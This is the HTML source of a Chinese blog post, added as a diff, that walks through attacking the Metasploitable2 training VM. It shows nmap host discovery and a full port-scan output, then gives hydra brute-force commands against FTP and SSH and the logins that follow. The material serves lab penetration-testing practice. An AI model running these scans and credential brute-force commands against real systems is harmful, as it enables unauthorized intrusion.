@@ -1,0 +1,1687 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#00FFFF">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#00FFFF">
+
+
+
+
+
+  <meta name="keywords" content="靶机渗透," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="该靶机作用是用来作为MSF攻击用的靶机,是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统">
+<meta name="keywords" content="靶机渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploitable2靶机渗透">
+<meta property="og:url" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;index.html">
+<meta property="og:site_name" content="CyzCc&#39;s blog">
+<meta property="og:description" content="该靶机作用是用来作为MSF攻击用的靶机,是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591752316703.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;XIxIpo4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;rL3HIip.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;5lO0VAs.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;7ohzV4D.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591761037664.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591842916873.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591843615410.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591843699978.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591846786014.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591846965570.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591864439751.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591864645403.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591864665322.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591865799083.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591867632649.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591867673441.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591884406824.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591881378614.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591881465105.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591881659308.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591887506202.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591869167703.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591869383056.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591870573718.png">
+<meta property="og:updated_time" content="2020-06-15T08:21:30.120Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;06&#x2F;15&#x2F;Metasploitable2&#x2F;1591752316703.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://cyzcc.vip/2020/06/15/Metasploitable2/"/>
+
+
+
+
+<!--留言-->
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "9e261f4f"
+    });
+  daovoice('update');
+  </script>
+
+
+  <title>Metasploitable2靶机渗透 | CyzCc's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CyzCc's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">♫日常学习笔记整理♬♬</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页|随笔">
+          <a href="/home/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            主页|随笔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-一些知识点">
+          <a href="/guestbook/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-comments"></i> <br />
+            
+            一些知识点
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cyzcc.vip/2020/06/15/Metasploitable2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CyzCc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CyzCc's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Metasploitable2靶机渗透</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-15T16:05:39+08:00">
+                2020-06-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/06/15/Metasploitable2/" class="leancloud_visitors" data-flag-title="Metasploitable2靶机渗透">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  17
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>该靶机作用是用来作为MSF攻击用的靶机,是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统</strong></p>
+<a id="more"></a>
+
+<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><strong>参考文章：</strong><a href="http://metasploit.lofter.com/post/d9d60_6a924d" target="_blank" rel="noopener">http://metasploit.lofter.com/post/d9d60_6a924d</a></p>
+<p>Metasploitable是一个虚拟机文件，从网上下载解压之后就可以直接使用，无需安装。Metasploitable基于Ubuntu<br>Linux，由于基于Ubuntu，用起来十分得心应手。Metasploitbale建立的初衷，其实就是为了测试一下本家的MSF漏洞框架集工具，所以，它的内核是2.6.24，而且一般在Liunx会产生问题的服务、工具或者软件它都集齐了（请看下文…）。版本2添加了更多的漏洞，而且更让人兴奋的是，系统搭载了DVWA、Mutillidae等Web漏洞演练平台。</p>
+<h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/15/Metasploitable2/1591752316703.png" alt="1591752316703"></p>
+<blockquote>
+<p>192.168.211.157</p>
+</blockquote>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.157</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line"><span class="number">21</span>/tcp    open  ftp         vsftpd <span class="number">2.3</span><span class="number">.4</span></span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to <span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span></span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds <span class="keyword">is</span> <span class="number">300</span></span><br><span class="line">|      Control connection <span class="keyword">is</span> plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      vsFTPd <span class="number">2.3</span><span class="number">.4</span> - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line"><span class="number">22</span>/tcp    open  ssh         OpenSSH <span class="number">4.7</span>p1 Debian <span class="number">8</span>ubuntu1 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">1024</span> <span class="number">60</span>:<span class="number">0f</span>:cf:e1:c0:<span class="number">5f</span>:<span class="number">6</span>a:<span class="number">74</span>:d6:<span class="number">90</span>:<span class="number">24</span>:fa:c4:d5:<span class="number">6</span>c:cd (DSA)</span><br><span class="line">|_  <span class="number">2048</span> <span class="number">56</span>:<span class="number">56</span>:<span class="number">24</span>:<span class="number">0f</span>:<span class="number">21</span>:<span class="number">1</span>d:de:a7:<span class="number">2</span>b:ae:<span class="number">61</span>:b1:<span class="number">24</span>:<span class="number">3</span>d:e8:f3 (RSA)</span><br><span class="line"><span class="number">23</span>/tcp    open  telnet      Linux telnetd</span><br><span class="line"><span class="number">25</span>/tcp    open  smtp        Postfix smtpd</span><br><span class="line">|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE <span class="number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, <span class="number">8</span>BITMIME, DSN, </span><br><span class="line">|_smtp-ntlm-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ssl-date: <span class="number">2020</span><span class="number">-06</span><span class="number">-09</span>T13:<span class="number">27</span>:<span class="number">07</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">4</span>s <span class="keyword">from</span> scanner time.</span><br><span class="line"><span class="number">53</span>/tcp    open  domain      ISC BIND <span class="number">9.4</span><span class="number">.2</span></span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: <span class="number">9.4</span><span class="number">.2</span></span><br><span class="line"><span class="number">80</span>/tcp    open  http        Apache httpd <span class="number">2.2</span><span class="number">.8</span> ((Ubuntu) DAV/<span class="number">2</span>)</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.2</span><span class="number">.8</span> (Ubuntu) DAV/<span class="number">2</span></span><br><span class="line">|_http-title: Metasploitable2 - Linux</span><br><span class="line"><span class="number">111</span>/tcp   open  rpcbind     <span class="number">2</span> (RPC #<span class="number">100000</span>)</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn Samba smbd <span class="number">3.</span>X - <span class="number">4.</span>X (workgroup: WORKGROUP)</span><br><span class="line"><span class="number">445</span>/tcp   open  netbios-ssn Samba smbd <span class="number">3.</span>X - <span class="number">4.</span>X (workgroup: WORKGROUP)</span><br><span class="line"><span class="number">512</span>/tcp   open  exec        netkit-rsh rexecd</span><br><span class="line"><span class="number">513</span>/tcp   open  login       OpenBSD <span class="keyword">or</span> Solaris rlogind</span><br><span class="line"><span class="number">514</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">1099</span>/tcp  open  java-rmi    GNU Classpath grmiregistry</span><br><span class="line"><span class="number">1524</span>/tcp  open  bindshell   Metasploitable root shell</span><br><span class="line"><span class="number">2049</span>/tcp  open  nfs         <span class="number">2</span><span class="number">-4</span> (RPC #<span class="number">100003</span>)</span><br><span class="line"><span class="number">2121</span>/tcp  open  ftp         ProFTPD <span class="number">1.3</span><span class="number">.1</span></span><br><span class="line"><span class="number">3306</span>/tcp  open  mysql       MySQL <span class="number">5.0</span><span class="number">.51</span>a<span class="number">-3</span>ubuntu5</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: <span class="number">10</span></span><br><span class="line">|   Version: <span class="number">5.0</span><span class="number">.51</span>a<span class="number">-3</span>ubuntu5</span><br><span class="line">|   Thread ID: <span class="number">8</span></span><br><span class="line">|   Capabilities flags: <span class="number">43564</span></span><br><span class="line">|   Some Capabilities: LongColumnFlag, Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, ConnectWithDatabase, SupportsCompression</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|_  Salt: <span class="symbol">EkjSC2pas@</span>$<span class="symbol">1i@</span>BhiSFB</span><br><span class="line"><span class="number">3632</span>/tcp  open  distccd     distccd v1 ((GNU) <span class="number">4.2</span><span class="number">.4</span> (Ubuntu <span class="number">4.2</span><span class="number">.4</span><span class="number">-1</span>ubuntu4))</span><br><span class="line"><span class="number">5432</span>/tcp  open  postgresql  PostgreSQL DB <span class="number">8.3</span><span class="number">.0</span> - <span class="number">8.3</span><span class="number">.7</span></span><br><span class="line">|_ssl-date: <span class="number">2020</span><span class="number">-06</span><span class="number">-09</span>T13:<span class="number">26</span>:<span class="number">56</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">4</span>s <span class="keyword">from</span> scanner time.</span><br><span class="line"><span class="number">5900</span>/tcp  open  vnc         VNC (protocol <span class="number">3.3</span>)</span><br><span class="line">| vnc-info: </span><br><span class="line">|   Protocol version: <span class="number">3.3</span></span><br><span class="line">|   Security types: </span><br><span class="line">|_    VNC Authentication (<span class="number">2</span>)</span><br><span class="line"><span class="number">6000</span>/tcp  open  X11         (access denied)</span><br><span class="line"><span class="number">6667</span>/tcp  open  irc         UnrealIRCd</span><br><span class="line">| irc-info: </span><br><span class="line">|   users: <span class="number">1</span></span><br><span class="line">|   servers: <span class="number">1</span></span><br><span class="line">|   lusers: <span class="number">1</span></span><br><span class="line">|   lservers: <span class="number">0</span></span><br><span class="line">|   server: irc.Metasploitable.LAN</span><br><span class="line">|   version: Unreal3<span class="number">.2</span><span class="number">.8</span><span class="number">.1</span>. irc.Metasploitable.LAN </span><br><span class="line">|   uptime: <span class="number">0</span> days, <span class="number">0</span>:<span class="number">04</span>:<span class="number">08</span></span><br><span class="line">|   source ident: nmap</span><br><span class="line">|   source host: <span class="number">77221</span>F35<span class="number">.3</span>B88F125.FFFA6D49.IP</span><br><span class="line">|_  error: Closing Link: ljoynhpjb[<span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span>] (Quit: ljoynhpjb)</span><br><span class="line"><span class="number">6697</span>/tcp  open  irc         UnrealIRCd</span><br><span class="line"><span class="number">8009</span>/tcp  open  ajp13       Apache Jserv (Protocol v1<span class="number">.3</span>)</span><br><span class="line">|_ajp-methods: Failed to <span class="keyword">get</span> a valid response <span class="keyword">for</span> the OPTION request</span><br><span class="line"><span class="number">8180</span>/tcp  open  http        Apache Tomcat/Coyote JSP engine <span class="number">1.1</span></span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-server-header: Apache-Coyote/<span class="number">1.1</span></span><br><span class="line">|_http-title: Apache Tomcat/<span class="number">5.5</span></span><br><span class="line"><span class="number">8787</span>/tcp  open  drb         Ruby DRb RMI (Ruby <span class="number">1.8</span>; path /usr/lib/ruby/<span class="number">1.8</span>/drb)</span><br><span class="line"><span class="number">33959</span>/tcp open  java-rmi    GNU Classpath grmiregistry</span><br><span class="line"><span class="number">42344</span>/tcp open  nlockmgr    <span class="number">1</span><span class="number">-4</span> (RPC #<span class="number">100021</span>)</span><br><span class="line"><span class="number">49564</span>/tcp open  status      <span class="number">1</span> (RPC #<span class="number">100024</span>)</span><br><span class="line"><span class="number">58666</span>/tcp open  mountd      <span class="number">1</span><span class="number">-3</span> (RPC #<span class="number">100005</span>)</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">8</span>B:<span class="number">76</span>:<span class="number">3</span>D (VMware)</span><br></pre></td></tr></table></figure>
+
+<p>靶机开放了很多端口，逐个进行尝试</p>
+<h1 id="常用端口利用总结"><a href="#常用端口利用总结" class="headerlink" title="常用端口利用总结"></a>常用端口利用总结</h1><p><img src="/2020/06/15/Metasploitable2/XIxIpo4.png" alt="img"></p>
+<p><img src="/2020/06/15/Metasploitable2/rL3HIip.png" alt="img"></p>
+<p><img src="/2020/06/15/Metasploitable2/5lO0VAs.png" alt="img"></p>
+<p><img src="/2020/06/15/Metasploitable2/7ohzV4D.png" alt="img"></p>
+<h2 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h2><p><strong>端口说明：21端口主要用于FTP（File Transfer Protocol，文件传输协议）服务，FTP服务主要是为了在两台计算机之间实现文件的上传与下载，一台计算机作为FTP客户端，另一台计算机作为FTP服务器，可以采用匿名（anonymous）登录和授权用户名与密码登录两种方式登录FTP服务器。目前，通过FTP服务来实现文件的传输是互联网上上传、下载文件最主要的方法。另外，还有一个20端口是用于FTP数据传输的默认<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3%E5%8F%B7" target="_blank" rel="noopener">端口号</a>。</strong></p>
+<p>该处可以使用hydra进行ftp账号密码爆破</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hydra</span> 192<span class="selector-class">.168</span><span class="selector-class">.211</span><span class="selector-class">.157</span> <span class="selector-tag">ftp</span> <span class="selector-tag">-L</span> <span class="selector-tag">user</span><span class="selector-class">.txt</span> <span class="selector-tag">admin</span> <span class="selector-tag">-P</span> <span class="selector-tag">password</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/15/Metasploitable2/1591761037664.png" alt="1591761037664"></p>
+<p>之后登陆</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp <span class="number">192.168</span><span class="number">.211</span><span class="number">.157</span> <span class="number">21</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/15/Metasploitable2/1591842916873.png" alt="1591842916873"></p>
+<h2 id="22端口"><a href="#22端口" class="headerlink" title="22端口"></a>22端口</h2><p><strong>22端口就是ssh端口，PcAnywhere建立TCP和这一端口的连接可能是为了寻找ssh</strong><br>这里可以通过爆破22端口来进行攻击</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hydra</span> 192<span class="selector-class">.168</span><span class="selector-class">.211</span><span class="selector-class">.157</span> <span class="selector-tag">ssh</span> <span class="selector-tag">-L</span> <span class="selector-tag">user</span><span class="selector-class">.txt</span>  <span class="selector-tag">-P</span> <span class="selector-tag">password</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/15/Metasploitable2/1591843615410.png" alt="1591843615410"></p>
+<p>之后使用ssh登陆</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="symbol">msfadmin@</span><span class="number">192.168</span><span class="number">.211</span><span class="number">.157</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/15/Metasploitable2/1591843699978.png" alt="1591843699978"></p>
+<h2 id="23端口"><a href="#23端口" class="headerlink" title="23端口"></a>23端口</h2><p><strong>23端口是telnet的端口。Telnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个telnet会话，必须输入用户名和密码来登录服务器。Telnet是常用的远程控制Web服务器的方法。</strong></p>
+<p>依旧是使用hydra进行爆破</p>
